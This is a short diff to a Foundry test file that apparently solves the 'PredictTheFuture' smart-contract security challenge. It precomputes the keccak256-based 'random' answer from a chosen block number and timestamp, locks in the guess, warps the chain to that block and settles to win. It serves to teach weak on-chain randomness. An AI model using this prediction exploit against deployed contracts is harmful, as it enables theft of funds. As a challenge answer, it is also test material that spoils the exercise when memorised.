@@ -22,7 +22,13 @@ contract PredictTheFutureTest is Test {
         vm.warp(93582192);
 
         // Put your solution here
+        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(uint256(104294), uint256(93582202))))) % 10;
 
+        //console.log(uint256(keccak256(abi.encodePacked(uint256(104294), uint256(93582202)))));
+        predictTheFuture.lockInGuess{value: 1 ether}(answer);
+        vm.roll(104295);
+        vm.warp(93582202);
+        predictTheFuture.settle();
         _checkSolved();
     }
 
